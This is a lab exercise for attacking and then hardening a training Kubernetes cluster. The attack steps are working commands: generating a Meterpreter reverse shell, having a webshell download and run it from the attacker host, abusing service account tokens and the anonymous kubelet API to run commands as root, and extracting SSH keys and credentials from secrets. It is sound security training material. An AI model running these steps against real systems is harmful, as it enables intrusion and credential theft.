---
layout: exercise
exercise: 150
title: "Bonus Exercise: Kubernetes Multitenant Attack and Defense"
tools: openssh-client dirbuster python3 metasploit-framework curl jq 
directories_to_sync: ssh-config K8S-Exercise
---

## Steps

1. Start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. 

2. SSH into the control plane node on the cluster:

	```shell
	ssh -i /sync/bustakube-node-key root@bustakube-controlplane
	```

3. Run `scenariochooser` and choose the second scenario by hitting `2` then `Enter`.

    ```shell
    scenariochooser
    2
    ```

4. Start up Firefox and browse to this URL.  You can use the icon on the desktop, or use the process from step 1.

    <http://bustakube-controlplane:31372>

5. Let's look for directories and files that either often bear fruit (things like `test.php`) or are well-known applications.  Use the Kali system's menu in the top left or the process from step 1 to run the `dirbuster` program:

    ```shell
    dirbuster
    ```

6. In the `dirbuster` window, fill out the target URL with <http://bustakube-controlplane:31372>

7. To complete the "File with list of dirs/files" box, choose the "Browse" box to its right, then navigate that window to `/usr/share/dirbuster/wordlists/` and choose `directory-list-lowercase-2.3-small.txt`.

8. Click the button that toggles off "Be recursive."

9. Now click the "Start" button in the lower right corner of the dirbuster window, so we can save time by not looking in subdirectories.

10. Now click the "Results-List View" tab to see the results update in real time.

11. Sort this alphabetically by the "Found" column by clicking the word "Found".  Stop the scan when it finds `backdoor.php`. The amount of time this takes depends on the number of requests per second you see. In one test, at 44 requests per second, this took 6 minutes. If you'd like, let this run but skip to the next step, stipulating that you found `backdoor.php` in the results.

12. We found a backdoor, left by someone who compromised this Wordpress server already! Check it out by browsing to: <http://bustakube-controlplane:31372/backdoor.php>

13. In the "execute command" window, enter `id` and hit the `Enter` key. You'll see what user this backdoor is running as.

14. Hit the browser's back (left arrow) button to get back to the `backdoor.php` URL.

15. Now, let's get a Meterpreter binary running via this backdoor.  Start up a terminal and switch to your home directory:

    ```shell
    cd ~
    ```

16. Next, create a fresh Meterpreter binary.

    ```shell
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp \
    LHOST=10.23.58.30 LPORT=4444 -e x86/shikata_ga_nai -o mrsbin -f elf
    ```

17. Now stage a web server in that terminal, hosting the `mrsbin` binary:

    ```shell
    python3 -m http.server 80
    ```

18. Next, start up a new terminal by hitting `Ctrl-Shift-T`.

19. Let's start up Metasploit to receive the Meterpreter connection.  Start a Metasploit console session:

    ```shell
    msfconsole
    ```

20. In the Metasploit console, run these commands to start a listener that's specific to this Meterpreter binary:

    ```ruby
    use exploit/multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    set LHOST 10.23.58.30
    exploit -j
    ```

21. Now, switch back to your browser, where you'll be telling the webshell to pull down and run the `mrsbin` Meterpreter binary.

22. Copy and paste this text into the "execute command" form item, then hit `Enter`.

    ```shell
    curl -O http://10.23.58.30/K8S-Exercise/kubectl ; curl -O http://10.23.58.30/mrsbin; chmod u+x mrsbin; ./mrsbin
    ```

23. Notice that the page seems to keep loading forever. That's a good thing – it means that the webshell hasn't finished executing the `mrsbin` program. If it ever does, we'll likely need to restart the `mrsbin` program through the webshell, unless we've found a method of persistence.

24. Switch back to the terminal window to see that your Metasploit console shows a "Meterpreter session N opened" where N is a number, usually 1.  Press `Enter`.

25. Interact with the meterpreter by typing `sessions -i N`, where N is that session number from the previous step.  If N = 1, type:

    ```shell
    sessions -i 1
    ```

26. Now get a shell by typing:

    ```shell
    shell
    ```

27. Let's make that environment a bit more hospitable by running a `bash` shell:

    ```shell
    bash -i
    ```

28. Find out what directory you're in, then list its contents:

    ```shell
    pwd
    ls -lart
    ```

29. Take a look around the filesystem if you like. Once you're done, look at the root filesystem of this pod and display the flag:

    ```shell
    ls /
    cat /FLAG-1.txt
    ```

30. Let's get ready to start running Kubernetes commands. First, let's make `kubectl` executable:

    ```shell
    chmod u+x kubectl
    ```

31. Next, let's get the IP address for the API server. Go back to your browser and start a new window by hitting `Control-N`.

32. In this new window, browse to the backdoor again:

    <http://bustakube-controlplane:31372/backdoor.php>

33. Copy and paste this text into the "execute command" window, then hit enter.

    ```shell
    env
    ```

34. Observe the IP address in the `KUBERNETES_PORT` variable on roughly the second line – it might be `10.96.0.1`.  You could use this in your `kubectl` commands, but we're going to use the DNS name `kubernetes.default.svc.cluster.local` to keep things simple.

35. Now let's go back to your terminal where you have the Metasploit console running.  We'll also need a service account token. Let's see if it's been mounted into the pod.

    ```shell
    mount | grep kubernetes
    ```

36. We can use a quick `awk` trick to parse this directory. This may be one of the only two `awk` tricks you'll ever need.

    ```shell
    mount | grep kubernetes | awk '{print $3}'
    ```

37. Let's store that directory in a shell variable.

    ```shell
    d=`mount | grep kubernetes | awk '{print $3}'`
    ```

38. Now we'll use that directory variable. List that directory:

    ```shell
    ls $d
    ```

39. Find out what namespace you're in by looking at that namespace file:

    ```shell
    cat $d/namespace
    ```

40. Let's put that namespace in a shell variable too.

    ```shell
    export ns=`cat $d/namespace`
    ```

41. Set up a `kubectl` command alias to make your `kubectl` commands easier, building it from the contents of that service account directory (_Note: Instead of using an IP address for the server, we're using the DNS entry that Kubernetes always creates._):

    ```shell
    alias kubectl="`pwd`/kubectl --server=https://kubernetes.default.svc.cluster.local:443 --token=`cat $d/token` --certificate-authority=$d/ca.crt -n $ns"
    ```

42. Look at that command one more time – there are a few embedded commands in there. Here are two examples:

    ```shell
    `pwd`/kubectl
    ```

    embeds `pwd` (print working directory) to give us a full pathname of our `kubectl` binary; and

    ```shell
    --token=`cat $dir/token`
    ```

    puts the contents of the token file into the alias.

43. Now check out your handiwork by running the `alias` command:

    ```shell
    alias
    ```

44. Next, test out the alias by trying to list pods in your current namespace:

    ```shell
    kubectl get pods
    ```

45. Let's make sure we know which pod we're in by running:

    ```shell
    hostname
    ```

46. Now, let's try running an interactive shell in the other pod in our namespace. Since these pods are put in place by a Kubernetes deployment, they don't have exactly the same name on your machine as ours, so here's a command to stuff the other pod's name into a variable:

    ```shell
    pod=`kubectl get pods | grep wordpress-mysql | awk '{print $1}'`
    ```

47. Let's copy `kubectl` into that pod:

    ```shell
    kubectl cp kubectl $pod:/tmp
    ```

48. Let's use `kubectl exec` to run a command in that mysql pod, using `-it` to make it interactive:

    ```shell
    kubectl exec -it $pod -- /bin/bash
    ```

49. Confirm we've switched pods by checking the hostname:

    ```shell
    hostname
    ```

    **Note**:  From this point on, if you have to hit `Ctrl-C`, here's what you can type to get back from the Meterpreter into the `wordpress-mysql` pod.

    ```shell
    shell
    bash -i
    d=`mount | grep kubernetes | awk '{print $3}'`
    alias kubectl="`pwd`/kubectl --server=https://10.96.0.1:443 --token=`cat $d/token` --certificate-authority=$d/ca.crt \
    -n `cat $d/namespace`"
    pod=`kubectl get pods | grep wordpress-mysql | awk '{print $1}'`
    kubectl exec -it $pod -- /bin/bash
    hostname
    ```

50. Let's check the root directory for another flag.

    ```shell
    ls -l /
    ```

51. Read the flag:

    ```shell
    cat /FLAG-2.txt
    ```

52. Just so we can see that an exec isn't going to work, let's run a `kubectl` command. First, note that we have the server information we need:

    ```shell
    env
    ```

53. Let's try listing pods:

    ```shell
    /tmp/kubectl get pods
    ```

54. Note that the error message tells us that we're using a different service account now: this one is named `system:serviceaccount:mktg:mysql`, whereas the other was specific to wordpress. This service account isn't allowed to even list pods, much less exec into any.

55. Let's see if we can find the IP addresses of the nodes:

    ```shell
    /tmp/kubectl get nodes
    ```

56. Let's communicate with the read-and-write API on the kubelet on a node, which listens on TCP port `10250`. We'll try the control-plane node, but we could try this on any node. We'll start by asking for a list of the running pods. We'll need the control-plane node's external IP address, since the pod doesn't have this node in its `/etc/hosts` file. You can get that IP address from your Kali system's `/etc/hosts` file.

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/
    ```

57. Note that what you received back was JSON output – you can read it, but it's much easier to read if you parse it with a tool.  The next six intermediate steps will let you experiment with the `jq` tool, short for JSON query. If you'd like, skip these steps and go straight to the step that reads "Now, let's get a list of all the pod names, with their namespaces."

58. Let's get a list of the entries in this JSON output's items array.

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items'
    ```

59. Now let's see if we can get just the first item.

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items[0] '
    ```

60. Now let's see if we can get just the name entry for the first item.

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items[0] | { name: .metadata.name }'
    ```

61. Note that the pod name we got probably wasn't the same pod name as when we got the first item.  This list is coming out unordered, different each time.  Run that same command again to see.

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items[0] | { name: .metadata.name }'
    ```

62. Let's add the pod's namespace to that.

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items[0] | { name: .metadata.name , namespace: .metadata.namespace}'
    ```

63. To work with the whole set of items, we'll need to send `.items` through an array sifter.  We run:

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items | .[]'
    ```

64. Now, let's get a list of all the pod names, with their namespaces.

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items | .[] | {name: .metadata.name , ns: .metadata.namespace }'
    ```

65. Note that the only pod running on the control-plane node that isn't part of the `kube-system` namespace is `dev-pod` which runs in the `dev` namespace. You can view the entire output of the last command by hitting `Shift-PageUp` and `Shift-PageDown`.

66. Let's look at the container names in `dev-pod`. We'll add the container names to the `jq` query, then use `grep` to grab only that part of the output:

    ```shell
    curl -ks https://10.23.58.40:10250/runningpods/ | jq '.items | .[] |
    {name: .metadata.name , ns: .metadata.namespace , containers: [.spec.containers[].name] }'|
    grep -A 6 -B 1 dev-pod
    ```

67. Note that this pod has two containers: `dev-web` and `dev-sync`.  This seems to match a pattern we see all the time, where we have a web server program to serve content and remote file transfer program that pulls the latest copies of that content into the directory that the web server program uses to serve it.

68. Let's use the Kubelet API again, asking the `dev-sync` pod to run `id` for us. The format for the URL on this API call is `/run/namespace/pod/container/`.  We use a `POST` request and pass in the command in the argument `cmd`:

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-sync/ -d "cmd=id"
    ```

69. We received an error, because there's no shell in that container. Let's try doing the same on the `dev-web` container:

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=id"
    ```

70. That's more like it! We see that we can run commands in that pod and that they run as `root`! Let's look for a flag.

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=ls -l /"
    ```

71. Let's check out that flag:

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=cat /FLAG-3.txt"
    ```

72. Get that SSH key! It's stored as a secret available only to dev-pod's service account. First, list the dev namespace's secrets.

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=kubectl get secrets"
    ```

73. Now, request a copy of the `ssh-key` secret.

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=kubectl get secret ssh-key -o yaml"
    ```

74. The base64-encoded secret is in there. Let's put it into a file called `ssh.secret`:

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=kubectl get secret ssh-key -o yaml" >ssh.secret
    ```

75. Now let's parse that file, pulling the `bustakube-ssh-key:` line, getting just the second part of the line, and `base64` decoding it:

    ```shell
    cat ssh.secret | grep " bustakube-ssh-key:" | awk '{print $2}' | base64 -d
    ```

76. Congratulations! You've got the private SSH key! Let's see what that other secret was, the one called `mainframe-login`.

77. Request the `mainframe-login` secret:

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=kubectl get secret mainframe-login -o yaml"
    ```

78. Now store it in a file we can parse:

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=kubectl get secret mainframe-login -o yaml" >mainframe.yaml
    ```

79. Now, parse it in the same way as above:

    ```shell
    cat mainframe.yaml | grep " mainframe-login:" | awk '{print $2}' | base64 -d
    ```

80. Ah hah! The "mainframe" in question is the Kubernetes cluster. Let's try logging into `root`'s account on the Kubernetes cluster control-plane node.

81. Copy that SSH key from this Metasploit terminal tab by highlighting it and hitting `Ctrl-Shift-C`.

82. Now, let's do all our SSH-ing from the host Kali system. Start up a new terminal window/tab on your Kali system.

83. Start up mousepad and use it to create a file you can paste the text into:

    ```shell
    mousepad /root/sshkey
    ```

84. Paste the key into mousepad with `Ctrl-V`.

85. Save the file with `Ctrl-S`.

86. Exit mousepad with `Ctrl-Q`.

87. Next, set the permissions on that key, like so:

    ```shell
    chmod 0700 /root/sshkey
    ```

88. Now, `ssh` in as `root` to the control-plane node:

    ```shell
    ssh -i /root/sshkey root@bustakube-controlplane
    ```

89. OK - so we've got `root`! We're done! Let's turn around and defend this cluster.

90. We can block those curl commands against the Kubelet by activating its Webhook authorizer and deactivating anonymous authentication. We'll be editing the kubelet's configuration file in `/var/lib/kubelet/config`.yaml.

91. This cluster automates this change with `/usr/local/bin/toggle-kubelet-anonymous.sh` - take a look at it:

    ```shell
    less /usr/local/bin/toggle-kubelet-anonymous.sh
    ```

92. Effect the change by running the toggle script with activate:

    ```shell
    /usr/local/bin/toggle-kubelet-anonymous.sh deactivate
    ```

93. Now go back to the Metasploit window, where you were running commands in the mysql pod, and try the Kubelet attack again:

    ```shell
    curl -ks https://10.23.58.40:10250/run/dev/dev-pod/dev-web/ -d "cmd=id"
    ```

94. It's important to note that we need to make the Webhook change on all nodes in the cluster. The attack was only blocked here because the attack was against the control-plane node. If you'd like to do this now, you can log in to the other nodes in this cluster and run the same script.
